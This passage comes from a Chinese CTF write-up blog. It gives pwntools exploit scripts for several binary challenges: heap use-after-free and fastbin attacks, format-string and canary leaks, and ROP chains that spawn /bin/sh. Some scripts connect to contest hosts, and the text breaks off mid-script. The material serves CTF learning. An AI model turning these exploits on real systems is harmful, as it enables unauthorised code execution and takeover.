class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0xa</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf2</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+<span class="string">'\x00\x02'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(heap+<span class="number">0x218</span>,<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x3</span>+p64(<span class="number">0</span>)+p64(libc.address+one[<span class="number">3</span>])+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>))<span class="comment">#3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__realloc_hook'</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"1 "</span>+<span class="string">'1'</span>*<span class="number">0x400</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="BST"><a href="#BST" class="headerlink" title="BST"></a>BST</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>这道题分析了好久，最后出来好像是非预期。。。</p>
<p>因为不太懂c++，所以是直接在gdb下一步一步调试出功能的，主要就是一个0x30大小的结构体(数据类型。。。呃。。随便就好)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bst</span>&#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> idx;</span><br><span class="line">    <span class="keyword">int64_t</span>	<span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">int64_t</span>	*data_ptr;</span><br><span class="line">    <span class="keyword">int64_t</span>	*left_node;</span><br><span class="line">    <span class="keyword">int64_t</span>	*right_node;</span><br><span class="line">    <span class="keyword">int64_t</span>	*parent_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在尝试申请5-&gt;3-&gt;4-&gt;2后，free节点3（即同时存在左右节点和父节点）的时候，发现存在uaf漏洞：</p>
<p>free前：</p>
<figure class="highlight h"><table><tr><td class="code"><pre><span class="line">节点<span class="number">5</span>：</span><br><span class="line"><span class="number">0x55bccacf5d10</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d20</span>:	<span class="number">0x00000005</span>	<span class="number">0x00000000</span>	<span class="number">0x00000068</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d30</span>:	<span class="number">0xcacf5d60</span>	<span class="number">0x000055bc</span>	<span class="number">0xcacf5e60</span>	<span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5d40</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">节点<span class="number">3</span>：</span><br><span class="line"><span class="number">0x55bccacf5e50</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e60</span>:	<span class="number">0x00000003</span>	<span class="number">0x00000000</span>	<span class="number">0x00000028</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e70</span>:	<span class="number">0xcacf5ea0</span>	<span class="number">0x000055bc</span>	<span class="number">0xcacf5e20</span>	<span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e80</span>:	<span class="number">0xcacf5de0</span>	<span class="number">0x000055bc</span>	<span class="number">0xcacf5d20</span>	<span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">4</span>：</span><br><span class="line"><span class="number">0x55bccacf5dd0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5de0</span>:	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0x00000068</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5df0</span>:	<span class="number">0xcacf5ee0</span>	<span class="number">0x000055bc</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e00</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0xcacf5e60</span>	<span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">2</span>：</span><br><span class="line"><span class="number">0x55bccacf5e10</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e20</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000000</span>	<span class="number">0x00000068</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e30</span>:	<span class="number">0xcacf5f60</span>	<span class="number">0x000055bc</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e40</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0xcacf5e60</span>	<span class="number">0x000055bc</span></span><br></pre></td></tr></table></figure>

<p>free后：</p>
<figure class="highlight h"><table><tr><td class="code"><pre><span class="line">节点<span class="number">5</span>：</span><br><span class="line"><span class="number">0x55bccacf5d10</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d20</span>:	<span class="number">0x00000005</span>	<span class="number">0x00000000</span>	<span class="number">0x00000068</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5d30</span>:	<span class="number">0xcacf5d60</span>	<span class="number">0x000055bc</span>	<span class="number">0xcacf5e60</span>	<span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5d40</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line">节点<span class="number">4</span>：</span><br><span class="line"><span class="number">0x55bccacf5e50</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e60</span>:	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0x00000068</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e70</span>:	<span class="number">0xcacf5fe0</span>	<span class="number">0x000055bc</span>	<span class="number">0xcacf5e20</span>	<span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e80</span>:	<span class="number">0xcacf5de0</span>	<span class="number">0x000055bc</span>	<span class="number">0xcacf5d20</span>	<span class="number">0x000055bc</span></span><br><span class="line">节点<span class="number">2</span>：</span><br><span class="line"><span class="number">0x55bccacf5e10</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e20</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000000</span>	<span class="number">0x00000068</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e30</span>:	<span class="number">0xcacf5f60</span>	<span class="number">0x000055bc</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x55bccacf5e40</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0xcacf5e60</span>	<span class="number">0x000055bc</span></span><br><span class="line"><span class="number">0x55bccacf5e50</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000041</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>

<p>可以明显看到节点4中的右节点指针指向heap+0xde0，而这个地址并不在我们的现有节点中，查看下bins：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x55bccacf5dd0 —▸ 0x55bccacf5e90 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x55bccacf5ed0 —▸ 0x55bccacf5c10 —▸ 0x55bccacf5c90 ◂— 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>可以看到这个是一个被free后指针，所以我们可以通过构造申请从而像其中写入flag的地址，然后打印就可以了。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./BST"</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn","26420")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size,data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content"</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"4.updata_______"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"id:"</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>,<span class="string">'1'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x28</span>,<span class="string">'2'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">'3'</span>*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">'4'</span>*<span class="number">4</span>)</span><br><span class="line">gdb.attach(p, <span class="string">'b *$rebase(0x1789)'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x28</span>,p64(<span class="number">20</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x66666000</span>))</span><br><span class="line">show()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>glibc</tag>
        <tag>wp</tag>
        <tag>二叉树</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>2019第五空间线上初赛-WP</title>
    <url>/2020/05/09/wp/2019%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B/wp/</url>
    <content><![CDATA[<h3 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h3><p>首先覆盖掉seed，去掉rand()的随机化，然后通过输入的name进行格式化字符的泄漏，再通过rop串leak出libc_base，最后直接用one_gadgets getshell,exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">a=[<span class="number">7427</span>,<span class="number">39356</span>,<span class="number">9595</span>,<span class="number">54062</span>,<span class="number">67371</span>,<span class="number">42578</span>,<span class="number">92585</span>,<span class="number">76990</span>,<span class="number">22615</span>,<span class="number">53318</span>,<span class="number">12615</span>]</span><br><span class="line"><span class="comment">#p = process('./bf')</span></span><br><span class="line">pop_rdi = <span class="number">0xdb3</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50001</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name : '</span>,<span class="string">'%17$p%23$p'</span>+<span class="string">'a'</span>*<span class="number">18</span>+p64(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">'guess:'</span>,str(a[i]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary = int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">vmmap = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xabf</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x34</span>+p64(canary)+p64(<span class="number">0</span>)+p64(vmmap+pop_rdi)+p64(vmmap+<span class="number">0x202018</span>)+p64(vmmap+<span class="number">0x8A0</span>)+p64(vmmap+<span class="number">0XAbf</span>))</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr= u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name : '</span>,<span class="string">'a'</span>*<span class="number">28</span>+p64(<span class="number">0</span>))</span><br><span class="line"><span class="keyword">print</span> hex(vmmap+<span class="number">0x202018</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">'guess:'</span>,str(a[i]))</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">0x34</span>+p64(canary)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x41320</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>edit函数堆溢出，通过改fd破坏fastbin，申请到notes数组附近，利用了stderr高位是0x7f绕过check。然后把第0个格改为puts@got，show(0)来leak libc，再把第0个格改为atoi@got，edit(0)改为system，然后在传choice时传/bin/sh即可getshell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50007</span>)</span><br><span class="line">elf= ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dell</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'id:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x400cea')</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">dell(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">libc_base1 = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3C4B78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base1)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">dell(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x68</span>+p64(<span class="number">0x7f</span>)+p64(<span class="number">0x6020bd</span>))</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602020</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - obj.dump(<span class="string">'puts'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(<span class="number">0x602068</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,p64(libc_base+obj.dump(<span class="string">'system'</span>)))</span><br><span class="line">p.recvuntil(<span class="string">'choice &gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h2><p>首先通过00截断绕过strcmp函数，然后就是栈溢出泄漏libc再getshell了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process('./pwn11')</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50011</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn11'</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4012ab</span></span><br><span class="line">main = <span class="number">0x401162</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'nuoye'</span>)</span><br><span class="line">p.sendline(<span class="string">'abcd\x00'</span>+<span class="string">'a'</span>*<span class="number">0x1b</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(elf.got[<span class="string">'read'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(main))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'ok!\n'</span>)</span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">'read'</span>,read_addr)</span><br><span class="line">libc_base = read_addr-obj.dump(<span class="string">'read'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'nuoye'</span>)</span><br><span class="line">p.sendline(<span class="string">'abcd\x00'</span>+<span class="string">'a'</span>*<span class="number">0x1b</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc_base+obj.dump(<span class="string">'str_bin_sh'</span>))+p64(libc_base+obj.dump(<span class="string">'system'</span>))+p64(main))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>简单的栈溢出，可以看到有后门，开了PIE而已，所以覆盖下最低位即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./pwn13')</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50013</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.send(<span class="string">'a'</span>*<span class="number">0x27</span>+<span class="string">'b'</span>+<span class="string">'\x50'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>2019广外网安大赛-WP</title>
    <url>/2020/05/09/wp/2019%E5%B9%BF%E5%A4%96%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B/wp/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><p>首先用strpos计算出随机数值，并且弄好格式</p>
<p><img src="./img/1575162826401.png" alt="1575162826401"></p>
<p>再直接将该结果复制给php_mt_seed进行爆破</p>
<p><img src="./img/1575162876249.png" alt="1575162876249"></p>
<p>然后再回去把种子带入就可以得到字符串了</p>
<p><img src="./img/1575162911317.png" alt="1575162911317"></p>
<p>最后输回去并提交就get flag了√</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="史上最简单的pwn"><a href="#史上最简单的pwn" class="headerlink" title="史上最简单的pwn"></a>史上最简单的pwn</h2><p>这道题是一道c++的。。。不会分析，只知道只能写0x20个字节，随便试了下分析结果，发现输入存在I的时候会把I替换为pretty，所以利用这个可以达到栈溢出的目的。然后就是libc的问题。。。本地很远程爆的不太一样。。。直接LibcSearcher了：<br><img src="./img/1575164909373.png" alt="1575164909373"></p>
<h2 id="宇宙无敌难搞"><a href="#宇宙无敌难搞" class="headerlink" title="宇宙无敌难搞"></a>宇宙无敌难搞</h2><p>简单的栈溢出，就是覆盖的时候会覆盖到索引的值，所以可以直接把索引修改为ret地址就行了：</p>
<p><img src="./img/1575164779677.png" alt="1575164779677"></p>
<h2 id="pwn-me"><a href="#pwn-me" class="headerlink" title="pwn_me"></a>pwn_me</h2><p>这道题首先得去壳：upx -d pwn_me，然后就是各种检查绕过了</p>
<p>1.利用格式化字符串漏洞先泄漏pie，然后再向0x202010处写入’w’</p>
<p>2.填充0x259字符来获取到canary</p>
<p>3.输入0x80000000来绕过检查</p>
<p>4.构造payload，使其满足条件</p>
<p>最终exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = process('./pwn_me')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10027</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'please input the secret key~'</span>)</span><br><span class="line">p.sendline(<span class="string">'[m]'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'enter'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'say'</span>)</span><br><span class="line">p.sendline(<span class="string">'%14$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">pie = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x183d</span></span><br><span class="line">p.recvuntil(<span class="string">'again'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pay1 = <span class="string">'%119c%8$na%21$pa'</span>+p64(pie+<span class="number">0x202010</span>)</span><br><span class="line"><span class="keyword">print</span> len(pay1)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">a = int(p.recvuntil(<span class="string">'a'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">libc_base = a<span class="number">-240</span>-libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'magic'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x259</span>))</span><br><span class="line">p.recvuntil(<span class="string">'dream'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x259</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x258</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-ord(<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">p.recvuntil(<span class="string">'hat is this?!'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x80000000</span>))</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">'a'</span>*<span class="number">0x258</span>+p64(canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(one[<span class="number">1</span>]+libc_base)</span><br><span class="line">b = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pay2)):</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">88</span>:</span><br><span class="line">		b += <span class="string">'\x5a'</span></span><br><span class="line">	<span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">		b += <span 